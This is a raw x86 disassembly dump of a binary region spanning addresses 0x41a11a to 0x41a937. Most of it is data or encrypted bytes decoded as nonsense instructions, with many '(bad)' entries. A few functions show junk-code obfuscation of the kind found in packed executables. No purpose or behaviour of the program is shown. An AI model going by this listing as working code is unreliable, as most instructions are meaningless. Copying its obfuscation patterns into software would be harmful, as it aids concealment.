  41a11a:	push   ebp
  41a11b:	in     al,0x6a
  41a11d:	inc    edi
  41a11e:	dec    dh
  41a120:	sbb    BYTE PTR [esi+0x17b06b9f],cl
  41a126:	mov    ds:0x9063dfbe,eax
  41a12b:	pop    dx
  41a12d:	cli    
  41a12e:	mov    esi,0x696dfc2a
  41a133:	(bad)  
  41a134:	push   edx
  41a135:	jo     0x41a140
  41a137:	dec    eax
  41a138:	dec    esp
  41a139:	xor    dh,BYTE PTR [edx-0x35f8a7cb]
  41a13f:	les    edi,FWORD PTR [edx-0x3f]
  41a142:	fsubr  DWORD PTR [edi]
  41a144:	(bad)  
  41a145:	fcmovnbe st,st(3)
  41a147:	push   ds
  41a148:	mov    ?,WORD PTR [eax]
  41a14a:	pushf  
  41a14b:	in     eax,0x91
  41a14d:	dec    esi
  41a14e:	mov    eax,0xbd01d2af
  41a153:	push   es
  41a154:	mov    ebp,esp
  41a156:	adc    cl,BYTE PTR [esi+0x0]
  41a159:	push   es
  41a15a:	aad    0xa3
  41a15c:	mov    ebx,0xb7986203
  41a161:	ret    
  41a162:	out    0xfb,al
  41a164:	cmp    eax,0x885bb559
  41a169:	sahf   
  41a16a:	cs and eax,0xb06058ad
  41a170:	xchg   BYTE PTR ds:0x548bb1e8,dh
  41a176:	pop    ecx
  41a177:	int    0xdd
  41a179:	cmp    eax,ebp
  41a17b:	mov    BYTE PTR [ecx],dh
  41a17d:	add    BYTE PTR [eax],al
  41a17f:	pop    edi
  41a180:	leave  
  41a181:	ret    0x1c
  41a184:	mov    DWORD PTR ds:0x4228ae,0x3cc2
  41a18e:	cmp    cl,0x40
  41a191:	mov    DWORD PTR ds:0x4228f6,0x571c
  41a19b:	jae    0x41a710
  41a1a1:	mov    DWORD PTR ds:0x42289a,0x49b8
  41a1ab:	cmp    cl,0x20
  41a1ae:	mov    DWORD PTR ds:0x4228b6,0x4a57
  41a1b8:	jae    0x41a1ce
  41a1be:	shrd   eax,edx,cl
  41a1c1:	mov    DWORD PTR ds:0x4229c2,0x6fa1
  41a1cb:	shr    edx,cl
  41a1cd:	ret    
  41a1ce:	neg    eax
  41a1d0:	mov    eax,edx
  41a1d2:	jmp    0x41a708
  41a1d7:	fldenv [eax+edi*4]
  41a1da:	inc    edx
  41a1db:	cmp    BYTE PTR [edx],dl
  41a1dd:	pop    ecx
  41a1de:	adc    al,0xa6
  41a1e0:	inc    esp
  41a1e1:	xor    al,0x68
  41a1e3:	dec    eax
  41a1e4:	(bad)  
  41a1e5:	shr    BYTE PTR [esi+0x4e],1
  41a1e8:	cmp    DWORD PTR [esi+edx*1],ecx
  41a1eb:	in     eax,0x4
  41a1ed:	push   ss
  41a1ee:	push   ss
  41a1ef:	or     dl,BYTE PTR [ebp-0x3674d3c5]
  41a1f5:	mov    ?,WORD PTR [ebp-0x3208717e]
  41a1fb:	clc    
  41a1fc:	sub    bh,BYTE PTR [edx+0x272406c2]
  41a202:	inc    si
  41a204:	in     eax,dx
  41a205:	rcr    DWORD PTR [esi+ecx*8],cl
  41a208:	and    BYTE PTR [eax],cl
  41a20a:	mov    al,0x30
  41a20c:	mov    edi,0xf4c743fa
  41a211:	sbb    DWORD PTR [ecx-0x730ca2c0],ebx
  41a217:	push   ebx
  41a218:	push   esi
  41a219:	pop    esp
  41a21a:	mov    DWORD PTR [ebp+edx*4-0x7ad00c6],ebp
  41a221:	or     bh,ah
  41a223:	repz mov ch,0xa2
  41a226:	mov    al,ds:0x31394a00
  41a22b:	inc    ebx
  41a22c:	cwde   
  41a22d:	scas   al,BYTE PTR es:[edi]
  41a22e:	or     cl,BYTE PTR gs:[edi+edx*8]
  41a232:	mov    eax,0xd88bf4ab
  41a237:	and    eax,esi
  41a239:	call   0x4825:0x497acc75
  41a240:	dec    ebx
  41a241:	xor    eax,0xe6ddaa46
  41a246:	inc    BYTE PTR [ebx-0x57]
  41a249:	add    eax,0x9f701df3
  41a24e:	xchg   BYTE PTR [edx],al
  41a250:	fmul   QWORD PTR [edi+0x3a3f615e]
  41a256:	pop    es
  41a257:	or     BYTE PTR [ecx-0x5cedcac1],ah
  41a25d:	lods   al,BYTE PTR ds:[esi]
  41a25e:	fild   WORD PTR [ebp+0xf01c9f3]
  41a264:	and    BYTE PTR [ebx+0x6d6516ca],dl
  41a26a:	ins    BYTE PTR es:[edi],dx
  41a26b:	xchg   edi,eax
  41a26c:	adc    ebp,DWORD PTR [edi+0x73]
  41a26f:	push   0xffffffd0
  41a271:	or     ah,bl
  41a273:	imul   edx,DWORD PTR [esi+0x53],0xffffffca
  41a277:	sbb    dh,ch
  41a279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a27a:	(bad)  [edx]
  41a27c:	fiadd  WORD PTR es:[eax]
  41a27f:	aam    0xbd
  41a281:	jp     0x41a212
  41a283:	rol    BYTE PTR [edx-0x5f],cl
  41a286:	das    
  41a287:	dec    ebp
  41a288:	ror    BYTE PTR ss:[esi*1-0x70733b6],cl
  41a290:	jecxz  0x41a2dd
  41a292:	mov    al,ds:0x376f8d8c
  41a297:	adc    ebp,DWORD PTR [ebp-0x2d8be287]
  41a29d:	cli    
  41a29e:	mov    edi,0x81aef032
  41a2a3:	cmp    ah,BYTE PTR [esi-0x29]
  41a2a6:	inc    esi
  41a2a7:	or     DWORD PTR [ebx+0x56cbd57e],0xc5c2f56d
  41a2b1:	imul   ebx,DWORD PTR [ebp+0x3b154f38],0x40
  41a2b8:	fdivr  DWORD PTR [edx]
  41a2ba:	(bad)  
  41a2bb:	and    esi,ecx
  41a2bd:	clc    
  41a2be:	sbb    DWORD PTR [esi+ebp*2-0x1c596196],esp
  41a2c5:	push   0xf1464fbd
  41a2ca:	jg     0x41a2ce
  41a2cc:	mov    bl,0xbb
  41a2ce:	cmc    
  41a2cf:	push   esp
  41a2d0:	xchg   esp,eax
  41a2d1:	repnz inc DWORD PTR [esi-0x84adca8]
  41a2d8:	cmp    al,BYTE PTR [esi+0x48e56bb1]
  41a2de:	js     0x41a2f0
  41a2e0:	xchg   DWORD PTR ds:0x17912b14,esp
  41a2e6:	and    ecx,ebp
  41a2e8:	pop    ss
  41a2e9:	jmp    0x41a32b
  41a2eb:	xchg   edi,eax
  41a2ec:	ss int3 
  41a2ee:	(bad)  
  41a2f1:	sbb    DWORD PTR [ecx+edi*2-0x37],edi
  41a2f5:	dec    ecx
  41a2f6:	loop   0x41a287
  41a2f8:	out    dx,eax
  41a2f9:	retf   0xa37e
  41a2fc:	fisttp DWORD PTR [esi+0x7a409360]
  41a302:	test   DWORD PTR [ebx],esp
  41a304:	mov    eax,ds:0xe257b67b
  41a309:	push   ebx
  41a30a:	aas    
  41a30b:	or     BYTE PTR [eax+esi*4+0x53],bl
  41a30f:	in     al,0xf2
  41a311:	jge    0x41a2d4
  41a313:	mov    eax,0xce9f3658
  41a318:	jg     0x41a36a
  41a31a:	jne    0x41a325
  41a31c:	scas   al,BYTE PTR es:[edi]
  41a31d:	ror    BYTE PTR [esi],cl
  41a31f:	or     BYTE PTR [ebx],dl
  41a321:	and    ebx,esi
  41a323:	adc    DWORD PTR [esi+0x73e8f1ef],0xec95df9b
  41a32d:	xor    DWORD PTR [esp+eax*4+0x5],ecx
  41a331:	aam    0xe5
  41a333:	aad    0xc6
  41a335:	xor    al,0xe2
  41a337:	pop    ecx
  41a338:	nop
  41a339:	mov    ss,WORD PTR [edi-0x201a9d2b]
  41a33f:	lea    edx,[esi+0x7fd71df1]
  41a345:	inc    edi
  41a346:	dec    edi
  41a347:	sti    
  41a348:	mov    DWORD PTR [edi+0x1e],eax
  41a34b:	push   es
  41a34c:	out    0xba,al
  41a34e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a34f:	repnz sub bh,BYTE PTR [ecx]
  41a352:	mov    edx,DWORD PTR [eax-0xfae84c8]
  41a358:	fnsave [esi+eiz*8]
  41a35b:	inc    eax
  41a35c:	sbb    ax,bp
  41a35f:	mov    edi,0x3eb419cd
  41a364:	repnz and al,0xdb
  41a367:	jnp    0x41a3bf
  41a369:	int    0x75
  41a36b:	dec    eax
  41a36c:	out    0xb7,al
  41a36e:	mov    ds:0x261c14d1,eax
  41a373:	mov    ds:0xef7be8bb,eax
  41a378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a379:	ds jle 0x41a3ab
  41a37c:	inc    ebp
  41a37d:	imul   dx,WORD PTR [edx]
  41a381:	pop    edi
  41a382:	jp     0x41a3f9
  41a384:	mov    dh,0xb7
  41a386:	add    ch,BYTE PTR [eax+0x20]
  41a389:	call   0xc1d9:0xc49f00d9
  41a390:	icebp  
  41a391:	mov    ah,BYTE PTR ds:0x9a06ff8d
  41a397:	xor    dl,BYTE PTR [edx+0xf175df0]
  41a39d:	xor    al,0xc3
  41a39f:	cmp    DWORD PTR [eax+0x227d635c],0x2d7c6f84
  41a3a9:	sub    DWORD PTR [ebx],edx
  41a3ab:	pop    ebp
  41a3ac:	xlat   BYTE PTR ds:[ebx]
  41a3ad:	das    
  41a3ae:	adc    eax,0x7f81e019
  41a3b3:	inc    ecx
  41a3b4:	(bad)  
  41a3b5:	sbb    eax,0x2d7ca52d
  41a3ba:	outs   dx,DWORD PTR ds:[esi]
  41a3bb:	mov    bh,0xc7
  41a3bd:	mov    eax,ds:0x30b7574d
  41a3c2:	dec    esi
  41a3c3:	sub    al,BYTE PTR ds:0x9930e08b
  41a3c9:	pop    eax
  41a3ca:	or     eax,0x931572b3
  41a3cf:	loope  0x41a3c9
  41a3d1:	push   ebx
  41a3d2:	in     al,dx
  41a3d3:	lds    ebp,FWORD PTR [eax-0x43]
  41a3d6:	test   esp,0x22785365
  41a3dc:	mov    eax,ds:0x582cf258
  41a3e1:	mov    eax,ds:0x9e0b9175
  41a3e6:	fisttp DWORD PTR [ecx+ebp*2-0x2e]
  41a3ea:	fst    DWORD PTR [ecx]
  41a3ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3ed:	adc    eax,0x44e1a8a9
  41a3f2:	and    al,0x3b
  41a3f4:	adc    eax,0x1d0e76bf
  41a3f9:	xor    al,0xd6
  41a3fb:	pop    esi
  41a3fc:	push   es
  41a3fd:	mov    ebp,0xdd667090
  41a402:	das    
  41a403:	sbb    BYTE PTR [esp+ebx*8+0x73],ah
  41a407:	mov    eax,0x5c8378f3
  41a40c:	cmp    BYTE PTR [eax+0x48],cl
  41a40f:	fdiv   QWORD PTR [esi]
  41a411:	ss pop ecx
  41a413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a414:	sar    BYTE PTR [ebx],1
  41a416:	sbb    DWORD PTR [edi-0x506e17ba],edi
  41a41c:	push   eax
  41a41d:	cmp    BYTE PTR [ebx],bl
  41a41f:	xchg   esi,eax
  41a420:	sbb    al,ah
  41a422:	fwait
  41a423:	sti    
  41a424:	clc    
  41a425:	pop    ds
  41a426:	pop    ss
  41a427:	fsub   st(5),st
  41a429:	clc    
  41a42a:	cld    
  41a42b:	sub    eax,eax
  41a42d:	jmp    0x68e7:0xd42845a5
  41a434:	mov    edx,0xb030575
  41a439:	push   esp
  41a43a:	fstp   QWORD PTR ss:[eax+eax*2]
  41a43e:	shl    dh,0xfa
  41a441:	and    DWORD PTR [ebp-0x31],esi
  41a444:	jns    0x41a43d
  41a446:	xchg   ebp,eax
  41a447:	push   ebp
  41a448:	dec    edi
  41a449:	in     al,0xf
  41a44b:	mov    eax,DWORD PTR [edx+0x441d9d2a]
  41a451:	push   esi
  41a452:	adc    esi,DWORD PTR [ecx-0x7fb2adb9]
  41a458:	cmp    ecx,ecx
  41a45a:	jecxz  0x41a45e
  41a45c:	push   ebx
  41a45d:	test   ah,cl
  41a45f:	sub    eax,0x69576325
  41a464:	sub    DWORD PTR ds:0xb6f9c000,esi
  41a46a:	push   edx
  41a46b:	add    ch,BYTE PTR [ebx+eax*4-0x3]
  41a46f:	xor    edi,DWORD PTR [edx+0x24]
  41a472:	sbb    al,0x8f
  41a474:	scas   al,BYTE PTR es:[edi]
  41a475:	fsub   QWORD PTR [eax]
  41a477:	jmp    0xc4aa1d7e
  41a47c:	xchg   BYTE PTR ds:0xcb09c9b2,ah
  41a482:	push   edx
  41a483:	dec    ebx
  41a484:	in     al,dx
  41a485:	dec    ebp
  41a486:	xchg   esp,eax
  41a487:	push   eax
  41a488:	retf   
  41a489:	int    0x6b
  41a48b:	test   dh,ch
  41a48d:	push   eax
  41a48e:	pop    ss
  41a48f:	jbe    0x41a4a2
  41a491:	(bad)  
  41a492:	lea    edi,[ebx]
  41a494:	sbb    edi,esi
  41a496:	dec    esp
  41a497:	cmc    
  41a498:	add    edx,DWORD PTR [ebx+0x2]
  41a49b:	jne    0x41a455
  41a49d:	(bad)  
  41a49f:	xchg   DWORD PTR [esi],ecx
  41a4a1:	es mov eax,0x846d86b5
  41a4a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4a8:	pop    ss
  41a4a9:	cs cmp ch,bh
  41a4ac:	xchg   DWORD PTR [ebx+0x34],eax
  41a4af:	mov    ah,0xc2
  41a4b1:	dec    esp
  41a4b2:	rcl    DWORD PTR [ebx],0xdd
  41a4b5:	(bad)  
  41a4b6:	jmp    0x41a4d7
  41a4b8:	push   edi
  41a4b9:	call   0xfb9c:0xf4a0fb81
  41a4c0:	dec    esi
  41a4c1:	pusha  
  41a4c2:	mov    esp,0x4922c327
  41a4c7:	shl    BYTE PTR ds:0x745507be,0xf
  41a4ce:	pop    ebp
  41a4cf:	add    dh,BYTE PTR [ecx+0x47]
  41a4d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4d3:	ret    
  41a4d4:	mov    ecx,edi
  41a4d6:	mov    ebp,0xc11f705c
  41a4db:	adc    al,0x9c
  41a4dd:	into   
  41a4de:	sub    al,0xd3
  41a4e0:	(bad)  
  41a4e1:	aaa    
  41a4e2:	or     al,0x89
  41a4e4:	push   ebp
  41a4e5:	pop    ebp
  41a4e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4e7:	stc    
  41a4e8:	pushf  
  41a4e9:	test   BYTE PTR [edi-0x6e08949b],dh
  41a4ef:	ins    DWORD PTR es:[edi],dx
  41a4f0:	dec    ebx
  41a4f1:	mov    dh,0xd9
  41a4f3:	push   ecx
  41a4f4:	dec    esi
  41a4f5:	jno    0x41a4c9
  41a4f7:	enter  0x4d3,0x69
  41a4fb:	mov    ecx,0x542f35d5
  41a500:	lock push ss
  41a502:	and    al,0xc1
  41a504:	xchg   ebp,eax
  41a505:	push   ds
  41a506:	rol    DWORD PTR [esp+esi*2-0x56],cl
  41a50a:	mov    al,0xa4
  41a50c:	push   eax
  41a50d:	mov    dl,0x9a
  41a50f:	inc    edi
  41a510:	and    DWORD PTR [ecx],esp
  41a512:	ja     0x41a554
  41a514:	lods   al,BYTE PTR ds:[esi]
  41a515:	xor    edx,eax
  41a517:	in     al,dx
  41a518:	ror    DWORD PTR [esp+ebx*2],0x4a
  41a51c:	inc    edx
  41a51d:	iret   
  41a51e:	mov    bh,0xad
  41a520:	gs xor esp,edi
  41a523:	xchg   esp,eax
  41a524:	sub    bh,dh
  41a526:	outs   dx,DWORD PTR ds:[esi]
  41a527:	add    eax,0x919fa07
  41a52c:	cmp    dl,bl
  41a52e:	test   BYTE PTR [edi],bh
  41a530:	mov    dl,0x45
  41a532:	(bad)  
  41a533:	mov    al,ds:0xe427c91b
  41a538:	inc    ebx
  41a539:	or     BYTE PTR [eax+edi*8],ah
  41a53c:	cmp    al,0xbd
  41a53e:	cmp    dl,BYTE PTR [eax+0x3302361c]
  41a544:	inc    ebp
  41a545:	sbb    cl,BYTE PTR [ebp-0x36327887]
  41a54b:	push   ds
  41a54c:	inc    bh
  41a54e:	push   edi
  41a54f:	gs mov ch,0xb4
  41a552:	jg     0x41a59d
  41a554:	mov    dl,0x79
  41a556:	mov    ds,WORD PTR [edi]
  41a558:	jne    0x41a52d
  41a55a:	mov    ecx,0xa7f1bb82
  41a55f:	ins    BYTE PTR es:[edi],dx
  41a560:	mov    edx,0xd7ea627f
  41a565:	(bad)  
  41a566:	bnd jo 0x41a594
  41a569:	(bad)  [esi+0x1491acdb]
  41a56f:	lahf   
  41a570:	add    eax,ebx
  41a572:	call   0x9932742f
  41a577:	inc    ebx
  41a578:	lods   al,BYTE PTR ds:[esi]
  41a579:	cmp    BYTE PTR [ecx-0x4818404f],bh
  41a57f:	in     al,dx
  41a580:	sub    BYTE PTR [ebp-0x769b4333],0xe8
  41a587:	adc    al,0x1e
  41a589:	mov    esi,0x4e35b6a3
  41a58e:	in     al,0x61
  41a590:	fnstenv [ecx+ecx*8]
  41a593:	xchg   ecx,eax
  41a594:	sbb    ah,BYTE PTR [ecx+0x34c598f6]
  41a59a:	lock ret 
  41a59c:	ror    BYTE PTR [ebp+0x7c72bdd2],0xa8
  41a5a3:	clc    
  41a5a4:	sub    eax,0x62214b44
  41a5a9:	and    ebp,ebx
  41a5ab:	pop    ss
  41a5ac:	xchg   esp,eax
  41a5ad:	cmc    
  41a5ae:	les    esp,FWORD PTR [eax+0x72]
  41a5b1:	push   ebx
  41a5b2:	jnp    0x41a5d0
  41a5b4:	loop   0x41a5d5
  41a5b6:	rcr    BYTE PTR [esi+0x3b],0x5
  41a5ba:	xchg   dh,bl
  41a5bc:	add    DWORD PTR [ebp-0x187dc2d6],ebp
  41a5c2:	dec    esp
  41a5c3:	repnz aas 
  41a5c5:	jbe    0x41a5f4
  41a5c7:	dec    edx
  41a5c8:	dec    ebp
  41a5c9:	pop    ecx
  41a5ca:	or     al,0x6d
  41a5cc:	cmc    
  41a5cd:	inc    ecx
  41a5ce:	scas   al,BYTE PTR es:[edi]
  41a5cf:	jae    0x41a629
  41a5d1:	dec    edx
  41a5d2:	push   ebx
  41a5d3:	add    ebx,DWORD PTR [ebx+ebx*4-0x733bc40d]
  41a5da:	das    
  41a5db:	cmp    bh,BYTE PTR ds:0x43653182
  41a5e1:	repz repnz in eax,dx
  41a5e4:	das    
  41a5e5:	xor    ch,BYTE PTR [eax+0x73b6dcbc]
  41a5eb:	in     al,0x5b
  41a5ed:	shl    ah,cl
  41a5ef:	mov    al,0x95
  41a5f1:	mov    ah,0x88
  41a5f3:	hlt    
  41a5f4:	dec    edx
  41a5f5:	inc    edi
  41a5f6:	and    BYTE PTR [ebp+0x52],dh
  41a5f9:	stos   BYTE PTR es:[edi],al
  41a5fa:	mul    DWORD PTR [eax+0x751a8c21]
  41a600:	test   BYTE PTR [ebx],ch
  41a602:	cdq    
  41a603:	xor    eax,0xf5a3c23c
  41a608:	mov    BYTE PTR [ebx],cl
  41a60a:	sti    
  41a60b:	int3   
  41a60c:	xchg   esp,eax
  41a60d:	xchg   ecx,eax
  41a60e:	(bad)  [edx-0x2837c425]
  41a614:	repnz cmp BYTE PTR [ecx+0x56],dl
  41a618:	add    dh,BYTE PTR ds:0xe548ae4e
  41a61e:	pop    ss
  41a61f:	dec    edi
  41a620:	(bad)  
  41a621:	mov    edx,0xfec09fb5
  41a626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a627:	out    dx,al
  41a628:	adc    esp,DWORD PTR [ebx-0x46]
  41a62b:	rol    DWORD PTR [ebx-0x6],cl
  41a62e:	jb     0x41a646
  41a630:	dec    edi
  41a631:	repz and ebp,DWORD PTR [eax]
  41a634:	fnstcw WORD PTR [edi-0x3e993e4f]
  41a63a:	mov    edi,0x7be79268
  41a63f:	push   es
  41a640:	je     0x41a6b0
  41a642:	push   DWORD PTR [edi+0x3c0d39f2]
  41a648:	imul   esi,DWORD PTR [esi],0x7e
  41a64b:	rcr    al,1
  41a64d:	mov    edx,0x970cb11
  41a652:	mov    ah,0x3c
  41a654:	les    ebp,FWORD PTR gs:[ecx+ebx*4-0x72b96c8b]
  41a65c:	dec    esi
  41a65d:	jno    0x41a61d
  41a65f:	mov    al,0x9e
  41a661:	push   cs
  41a662:	add    eax,DWORD PTR [edi]
  41a664:	sub    BYTE PTR [ecx],bh
  41a666:	mov    bl,cl
  41a668:	or     BYTE PTR [esi+0x70],bh
  41a66b:	bound  ecx,QWORD PTR [esi-0x6]
  41a66e:	add    ecx,ebp
  41a670:	sbb    DWORD PTR [edx],ecx
  41a672:	push   0x27538900
  41a677:	(bad)  
  41a678:	je     0x41a5fe
  41a67a:	mov    ecx,0xd4684dfd
  41a67f:	push   edi
  41a680:	cmp    al,bh
  41a682:	pop    edi
  41a683:	jl     0x41a607
  41a685:	push   eax
  41a686:	out    dx,al
  41a687:	jno    0x41a695
  41a689:	xor    DWORD PTR [ecx+0x16],0xbb69a1ef
  41a690:	xor    al,0xa1
  41a692:	repz xchg ecx,eax
  41a694:	jns    0x41a669
  41a696:	sbb    BYTE PTR [eax-0x72],dh
  41a699:	je     0x41a6d6
  41a69b:	jne    0x41a668
  41a69d:	adc    bl,BYTE PTR [ecx+0x7d]
  41a6a0:	popf   
  41a6a1:	cmp    eax,0x90e09af
  41a6a6:	cld    
  41a6a7:	mov    cl,0xce
  41a6a9:	inc    ebx
  41a6aa:	jmp    0x36d8fed9
  41a6af:	push   ds
  41a6b0:	(bad)  
  41a6b1:	clc    
  41a6b2:	xchg   BYTE PTR [edx-0x54238b97],bl
  41a6b8:	add    BYTE PTR [edi+0x76],ch
  41a6bb:	xor    bl,BYTE PTR [edi+0x30c1ac95]
  41a6c1:	and    ch,BYTE PTR [ebp+0x22]
  41a6c4:	sub    al,0xfd
  41a6c6:	cmp    eax,edx
  41a6c8:	fst    DWORD PTR [esi+0x61]
  41a6cb:	mov    ds:0x5b542e7b,al
  41a6d0:	xchg   edx,eax
  41a6d1:	jae    0x41a689
  41a6d3:	pop    ecx
  41a6d4:	and    esp,DWORD PTR [edx-0x40e338de]
  41a6da:	(bad)  
  41a6db:	or     esp,DWORD PTR [esi-0x693ac99]
  41a6e1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41a6e3:	jne    0x41a70d
  41a6e5:	aam    0x8f
  41a6e7:	push   edx
  41a6e8:	sub    eax,0x8c75130f
  41a6ed:	sbb    al,0xe
  41a6ef:	jecxz  0x41a721
  41a6f1:	lds    ebp,FWORD PTR [esi]
  41a6f3:	mov    ah,0xfb
  41a6f5:	sub    al,0x7d
  41a6f7:	inc    ax
  41a6f9:	(bad)  
  41a6fa:	test   cl,0xf8
  41a6fd:	(bad)  
  41a6fe:	push   ds
  41a6ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a700:	sub    bh,cl
  41a702:	aaa    
  41a703:	adc    eax,0x3377c20b
  41a709:	rol    BYTE PTR [eax-0x172ce01f],cl
  41a70f:	ret    
  41a710:	xor    eax,eax
  41a712:	xor    edx,edx
  41a714:	ret    
  41a715:	push   ebp
  41a716:	mov    ebp,esp
  41a718:	sub    esp,0x40
  41a71b:	sub    ecx,ecx
  41a71d:	mov    DWORD PTR [ebp-0x18],0xba699573
  41a724:	xor    eax,ecx
  41a726:	mov    eax,0x9c0a89d8
  41a72b:	mov    edx,DWORD PTR ds:0x422976
  41a731:	sbb    DWORD PTR ds:0x42291a,edx
  41a737:	mov    DWORD PTR [ebp-0x14],eax
  41a73a:	mov    DWORD PTR [ebp-0x40],0xba699577
  41a741:	sub    edx,0x26e4
  41a747:	mov    DWORD PTR [ebp-0x3c],eax
  41a74a:	sbb    DWORD PTR ds:0x4228ba,edx
  41a750:	mov    DWORD PTR [ebp-0x28],0x644f
  41a757:	cmp    DWORD PTR ds:0x4228ae,0x0
  41a75e:	mov    ecx,DWORD PTR ds:0x4228fa
  41a764:	mov    DWORD PTR ds:0x42288a,edx
  41a76a:	mov    edx,DWORD PTR ds:0x42299e
  41a770:	jmp    0x41a7c9
  41a775:	mov    DWORD PTR ds:0x4229ce,ecx
  41a77b:	jbe    0x41a7ad
  41a781:	push   DWORD PTR [ebp-0x20]
  41a784:	call   DWORD PTR ds:0x42a028
  41a78a:	sub    DWORD PTR ds:0x42290a,0x27cb
  41a794:	movzx  ecx,BYTE PTR ds:0x422966
  41a79b:	and    ecx,DWORD PTR ds:0x4229d2
  41a7a1:	mov    DWORD PTR ds:0x422966,ecx
  41a7a7:	add    DWORD PTR ds:0x422972,edx
  41a7ad:	or     DWORD PTR ds:0x42296a,0x5f39
  41a7b7:	sbb    DWORD PTR ds:0x4229b6,edx
  41a7bd:	sbb    DWORD PTR ds:0x422932,edx
  41a7c3:	sub    edx,DWORD PTR ds:0x4228c2
  41a7c9:	mov    DWORD PTR [ebp-0x24],0x68c8
  41a7d0:	xor    eax,edx
  41a7d2:	mov    DWORD PTR [ebp-0x20],0x436a
  41a7d9:	cmp    DWORD PTR ds:0x4228aa,0x0
  41a7e0:	mov    edx,0x68cf
  41a7e5:	mov    DWORD PTR ds:0x422922,ebx
  41a7eb:	mov    edx,DWORD PTR ds:0x422936
  41a7f1:	jmp    0x41a823
  41a7f6:	mov    eax,ds:0x42292a
  41a7fb:	jne    0x41a818
  41a801:	push   0x4229b6
  41a806:	call   DWORD PTR ds:0x42a054
  41a80c:	adc    DWORD PTR ds:0x4229ba,ecx
  41a812:	sub    edx,DWORD PTR ds:0x4228aa
  41a818:	xor    DWORD PTR ds:0x4229ce,0x5de2
  41a822:	dec    ecx
  41a823:	mov    DWORD PTR [ebp-0x1c],0x58c6
  41a82a:	mov    DWORD PTR [ebp-0x10],0x7919
  41a831:	mov    DWORD PTR [ebp-0xc],0x6efc
  41a838:	mov    eax,DWORD PTR [ebp-0x10]
  41a83b:	sub    DWORD PTR ds:0x4228da,0x3418
  41a845:	mov    ecx,DWORD PTR [ebp-0xc]
  41a848:	jmp    0x41ac91
  41a84d:	mov    ?,WORD PTR [edx-0x20]
  41a850:	dec    ebx
  41a851:	fdiv   DWORD PTR [ecx]
  41a853:	adc    al,0x32
  41a855:	std    
  41a856:	cs aam 0xa8
  41a859:	popf   
  41a85a:	sub    eax,0x2f1caeba
  41a85f:	or     al,0x16
  41a861:	(bad)  
  41a862:	push   cs
  41a863:	push   ss
  41a864:	push   ss
  41a865:	and    DWORD PTR [ebx+0x79],ebx
  41a868:	sub    eax,0x9b419b01
  41a86d:	jno    0x41a811
  41a86f:	jmp    0x41a819
  41a871:	not    BYTE PTR [ecx]
  41a873:	pusha  
  41a874:	in     eax,dx
  41a875:	sub    ebx,DWORD PTR [ecx+0x1680f8e1]
  41a87b:	xchg   edi,eax
  41a87c:	nop
  41a87d:	shl    DWORD PTR [ebp-0x2f],1
  41a880:	sar    DWORD PTR [edx],0x53
  41a883:	add    eax,0x81276781
  41a888:	and    al,0x19
  41a88a:	mov    edi,0xac1c45f1
  41a88f:	xor    esi,ebx
  41a891:	xor    bh,BYTE PTR [ecx]
  41a893:	jle    0x41a84d
  41a895:	(bad)  
  41a896:	mov    al,0xb0
  41a898:	lods   al,BYTE PTR ds:[esi]
  41a899:	xor    bh,BYTE PTR [ecx+0x28]
  41a89c:	ffree  st(6)
  41a89e:	popa   
  41a89f:	inc    edx
  41a8a0:	jo     0x41a831
  41a8a2:	xor    eax,0xa85003f4
  41a8a7:	data16 jecxz 0x41a886
  41a8aa:	mov    ds:0x86fa5e24,al
  41a8af:	dec    edi
  41a8b0:	inc    eax
  41a8b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8b2:	std    
  41a8b3:	loop   0x41a900
  41a8b5:	scas   eax,DWORD PTR es:[edi]
  41a8b6:	pop    esi
  41a8b7:	(bad)  
  41a8b9:	dec    edx
  41a8ba:	smsw   ebp
  41a8bd:	in     al,dx
  41a8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8bf:	std    
  41a8c0:	adc    ecx,DWORD PTR [eax-0x3678bb90]
  41a8c6:	fnsave [ecx-0x287a9e4b]
  41a8cc:	mov    WORD PTR [ebx+0x3],?
  41a8cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8d0:	mov    ?,WORD PTR [ecx-0x64]
  41a8d3:	pushf  
  41a8d4:	rcr    BYTE PTR [ecx+ecx*1-0x177c458e],cl
  41a8db:	pop    eax
  41a8dc:	jmp    0xeac6:0x5ce30ddd
  41a8e3:	add    al,0x16
  41a8e5:	fild   DWORD PTR ds:0x780beea5
  41a8eb:	sbb    ecx,ebx
  41a8ed:	ja     0x41a8e8
  41a8ef:	cmp    BYTE PTR [edx],bl
  41a8f1:	mov    cl,0x96
  41a8f3:	inc    edi
  41a8f4:	inc    ebx
  41a8f5:	cmp    DWORD PTR es:[ecx],esp
  41a8f8:	xchg   edi,eax
  41a8f9:	(bad)  
  41a8fa:	pop    ss
  41a8fb:	inc    eax
  41a8fc:	das    
  41a8fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8fe:	mov    ebx,0x561c3297
  41a903:	fst    DWORD PTR [ebx-0x748ab8d]
  41a909:	pushf  
  41a90a:	bound  esi,QWORD PTR [edx-0x46249764]
  41a910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a911:	xor    ch,BYTE PTR [ebp+0x38]
  41a914:	inc    esi
  41a915:	or     DWORD PTR [ebp+ecx*8+0x1e],edx
  41a919:	iret   
  41a91a:	or     bl,al
  41a91c:	xchg   DWORD PTR [edx],ecx
  41a91e:	les    esp,FWORD PTR [esi+0x32]
  41a921:	jl     0x41a908
  41a923:	inc    esp
  41a924:	cmc    
  41a925:	xchg   edx,eax
  41a926:	rcr    BYTE PTR [edi+0x6d33ca55],cl
  41a92c:	pop    edi
  41a92d:	jne    0x41a97c
  41a92f:	mov    DWORD PTR [eax],ebp
  41a931:	ret    
  41a932:	mov    eax,0x381e5199
  41a937:	fst    DWORD PTR [ebx+ebx*8]
